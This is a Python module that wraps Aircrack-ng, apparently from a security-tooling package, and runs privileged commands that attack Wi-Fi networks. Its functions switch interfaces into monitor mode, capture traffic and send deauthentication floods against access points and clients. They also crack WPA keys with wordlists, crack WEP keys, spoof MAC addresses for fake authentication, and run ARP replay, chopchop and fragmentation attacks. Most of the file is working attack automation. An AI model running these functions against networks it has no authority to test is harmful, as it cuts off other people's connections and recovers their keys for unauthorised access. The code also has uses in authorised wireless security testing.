"""Live Aircrack-ng wrappers, re-exported through james.tools.parrot."""

import re
import shlex
import tempfile
from collections import Counter
from pathlib import Path

from james.layers.native import CommandResult, NativeLayer

_SYS_NET = Path("/sys/class/net")
_ARPHRD_RADIOTAP = 803
_MAC = re.compile(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", re.IGNORECASE)


def interface_name(value: str) -> str:
    if not re.fullmatch(r"[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,14}", value):
        raise ValueError(f"Invalid wireless interface name: {value!r}")
    return value


def radio_address(value: str) -> str:
    value = value.strip().lower()
    if not _MAC.fullmatch(value) or int(value[:2], 16) & 1 or value == "00:00:00:00:00:00":
        raise ValueError(f"Expected a unicast MAC address, got {value!r}")
    return value


class AircrackSuite:
    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def list_interfaces(self) -> list[dict]:
        """Report wireless interfaces that exist on this host."""
        if not _SYS_NET.is_dir():
            return []
        found = []
        for entry in sorted(_SYS_NET.iterdir()):
            if not (entry / "wireless").exists() and not (entry / "phy80211").exists():
                continue
            try:
                monitor = int((entry / "type").read_text()) == _ARPHRD_RADIOTAP
            except (OSError, ValueError):
                monitor = False
            found.append(
                {
                    "interface": entry.name,
                    "iface": entry.name,
                    "mode": "monitor" if monitor else "managed",
                }
            )
        return found

    def enable_monitor(self, interface: str) -> CommandResult:
        """Put an interface into monitor mode in place with iw.

        airmon-ng spawns a separate, renamed monitor vif (e.g. wlan0mon) for some
        USB drivers such as rtw89, which breaks interface tracking downstream and can
        leave the base interface unusable ("RTNETLINK answers: Operation not
        permitted"). Flipping the type in place with iw keeps the interface name
        stable across drivers and avoids the stray vif entirely.
        """
        q_iface = shlex.quote(interface_name(interface))
        cmd = (
            f"nmcli device set {q_iface} managed no 2>/dev/null || true; "
            f"rfkill unblock wlan 2>/dev/null || true; "
            f"ip link set {q_iface} down && "
            f"iw dev {q_iface} set type monitor && "
            f"ip link set {q_iface} up"
        )
        return self.layer.run(cmd, sudo=True, timeout=30)

    def disable_monitor(self, interface: str) -> CommandResult:
        """Restore managed mode in place with iw (matches enable_monitor)."""
        q_iface = shlex.quote(interface_name(interface))
        cmd = (
            f"if [ -e /sys/class/net/{q_iface} ]; then "
            f"ip link set {q_iface} down 2>/dev/null && iw dev {q_iface} set type managed 2>/dev/null && ip link set {q_iface} up 2>/dev/null || true; "
            f"nmcli device set {q_iface} managed yes 2>/dev/null || true; "
            f"fi"
        )
        return self.layer.run(cmd, sudo=True, timeout=30)

    def check_kill(self) -> CommandResult:
        return self.layer.run("airmon-ng check kill", sudo=True, timeout=15)

    @staticmethod
    def airodump_args(interface: str, *, channel=None, bssid=None, write_prefix=None) -> list[str]:
        args = ["airodump-ng", "--background", "1"]
        if channel:
            if not 1 <= int(channel) <= 233:
                raise ValueError("Capture channel must be between 1 and 233")
            args.extend(["--channel", str(int(channel))])
        if bssid:
            args.extend(["--bssid", radio_address(bssid)])
        if write_prefix:
            args.extend(
                [
                    "--write",
                    str(Path(write_prefix).absolute()),
                    "--output-format",
                    "pcap,csv",
                    "--write-interval",
                    "1",
                ]
            )
        return [*args, interface_name(interface)]

    def start_airodump(self, interface: str, *, channel=None, bssid=None, write_prefix=None):
        args = self.airodump_args(
            interface, channel=channel, bssid=bssid, write_prefix=write_prefix
        )
        return self.layer.run_background(shlex.join(args), sudo=True)

    @staticmethod
    def parse_airodump_csv(content: str) -> dict:
        """Read AP and station sections from airodump's CSV output."""
        if "\n" not in content and "," not in content and Path(content).is_file():
            content = Path(content).read_text(errors="replace")
        aps, stations = [], []
        station_section = False
        for line in content.splitlines():
            if line.lstrip().startswith("Station MAC,"):
                station_section = True
                continue
            row = line.split(",", 6 if station_section else 13)
            if not _MAC.fullmatch(row[0].strip()):
                continue
            try:
                if station_section and len(row) >= 6:
                    stations.append(
                        {
                            "station_mac": row[0].strip().lower(),
                            "bssid": row[5].strip().lower()
                            if _MAC.fullmatch(row[5].strip())
                            else "",
                            "power": int(row[3]),
                            "probes": row[6].strip() if len(row) == 7 else "",
                        }
                    )
                elif not station_section and len(row) == 14 and "," in row[13]:
                    # Airodump writes SSID bytes verbatim, including commas.
                    essid, _, _ = row[13].rpartition(",")
                    aps.append(
                        {
                            "bssid": row[0].strip().lower(),
                            "channel": int(row[3]),
                            "privacy": row[5].strip(),
                            "cipher": row[6].strip(),
                            "authentication": row[7].strip(),
                            "power": int(row[8]),
                            "data_packets": int(row[10]),
                            "essid": essid.removeprefix(" "),
                        }
                    )
            except ValueError:
                continue  # A partial line can be visible while airodump rewrites the file.
        clients = Counter(bssid for _, bssid in {(s["station_mac"], s["bssid"]) for s in stations})
        for ap in aps:
            ap["clients"] = clients[ap["bssid"]]
        return {"aps": aps, "stations": stations}

    def deauth(self, interface: str, bssid: str, *, count: int = 10, client: str | None = None):
        args = ["aireplay-ng", "-0", str(int(count)), "-a", radio_address(bssid)]
        if client:
            args.extend(["-c", radio_address(client)])
        return self.layer.run(shlex.join([*args, interface_name(interface)]), sudo=True, timeout=30)

    @staticmethod
    def crack_args(
        capture: str, *, bssid=None, wordlist=None, key_file=None, wep=False
    ) -> list[str]:
        args = ["aircrack-ng", "-a", "1" if wep else "2"]
        if bssid:
            args.extend(["-b", radio_address(bssid)])
        if wordlist:
            args.extend(["-w", str(Path(wordlist).absolute())])
        if key_file:
            args.extend(["-l", str(Path(key_file).absolute())])
        return [*args, str(Path(capture).absolute())]

    def _crack(self, capture, *, bssid, wordlist=None, wep=False):
        with tempfile.TemporaryDirectory(prefix="james-key-") as directory:
            key_path = Path(directory) / "key"
            cmd = shlex.join(
                self.crack_args(capture, bssid=bssid, wordlist=wordlist, key_file=key_path, wep=wep)
            )
            result = self.layer.run(cmd, timeout=300 if wep else 600)
            key = key_path.read_text(errors="replace") if key_path.is_file() else ""
        return {
            "found": bool(key),
            "key": key,
            "returncode": result.returncode,
            "output": result.stdout[-2000:],
            "command": cmd,
        }

    def crack_wpa(self, capture_file: str, wordlist: str, *, bssid: str | None = None) -> dict:
        return self._crack(capture_file, bssid=bssid, wordlist=wordlist)

    def crack_wep(self, capture_file: str, *, bssid: str | None = None) -> dict:
        return self._crack(capture_file, bssid=bssid, wep=True)

    @staticmethod
    def handshake_args(capture: str, bssid: str, prefix: Path) -> list[str]:
        return [
            "aircrack-ng",
            "-b",
            radio_address(bssid),
            "-j",
            str(prefix),
            str(Path(capture).absolute()),
        ]

    def check_handshake(self, capture_file: str, bssid: str) -> bool:
        with tempfile.TemporaryDirectory(prefix="james-handshake-") as directory:
            prefix = Path(directory) / "verify"
            result = self.layer.run(
                shlex.join(self.handshake_args(capture_file, bssid, prefix)), timeout=15
            )
            proof = prefix.with_suffix(".hccapx")
            return result.success and proof.is_file() and proof.stat().st_size > 0

    def fake_auth(self, interface: str, bssid: str, *, delay: int = 0) -> CommandResult:
        """Perform fake authentication against a WEP AP."""
        q_iface = shlex.quote(interface_name(interface))
        q_bssid = shlex.quote(radio_address(bssid))
        cmd = f"aireplay-ng -1 {int(delay)} -e '' -a {q_bssid} -h $(macchanger -s {q_iface} | grep -oP '[0-9a-f:]+' | head -1) {q_iface}"
        return self.layer.run(cmd, sudo=True, timeout=30)

    def arp_replay(self, interface: str, bssid: str, *, timeout: int = 300) -> CommandResult:
        """ARP request replay attack to generate IVs for WEP cracking."""
        cmd = shlex.join(["aireplay-ng", "-3", "-b", radio_address(bssid), interface_name(interface)])
        return self.layer.run(cmd, sudo=True, timeout=timeout)

    def chopchop(self, interface: str, bssid: str, *, timeout: int = 300) -> dict:
        """KoreK chopchop attack — decrypt a WEP packet without the key."""
        cmd = shlex.join(["aireplay-ng", "-4", "-b", radio_address(bssid), interface_name(interface), "-F"])
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        return {
            "command": cmd,
            "success": "Use packetforge-ng" in result.stdout or result.returncode == 0,
            "output": result.stdout[-2000:],
        }

    def fragment_attack(self, interface: str, bssid: str, *, timeout: int = 300) -> dict:
        """Fragmentation attack — obtain a PRGA keystream from WEP."""
        cmd = shlex.join(["aireplay-ng", "-5", "-b", radio_address(bssid), interface_name(interface), "-F"])
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        return {
            "command": cmd,
            "success": "Use packetforge-ng" in result.stdout or result.returncode == 0,
            "output": result.stdout[-2000:],
        }

    def interactive_replay(self, interface: str, bssid: str, *, timeout: int = 120) -> CommandResult:
        """Interactive packet selection replay (aireplay-ng -2)."""
        cmd = shlex.join(["aireplay-ng", "-2", "-b", radio_address(bssid), "-F", interface_name(interface)])
        return self.layer.run(cmd, sudo=True, timeout=timeout)
